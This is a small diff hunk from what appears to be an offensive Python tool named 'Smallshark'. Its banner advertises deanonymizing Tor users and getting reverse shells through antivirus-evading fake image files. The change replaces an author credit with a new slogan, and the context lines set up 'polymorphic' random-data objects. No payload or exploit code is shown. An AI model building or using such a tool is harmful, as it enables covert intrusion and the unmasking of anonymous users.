@@ -31,7 +31,7 @@ print(Fore.LIGHTBLUE_EX + r'''                                 ,-
 ascii_banner = pyfiglet.figlet_format("Smallshark")
 print(Fore.LIGHTWHITE_EX + ascii_banner)
 print("\nDeanonymization of TOR Users & getting reverse shell through antivirus evading fake image files.\n\n")
-print("//Created by Nemesis")
+print("LITTLE SHARK WANTS TO HUNT!\n\n")
 polymorphic = RandomData()
 polymorphic2 = RandomData()
 polymorphic3 = RandomData()
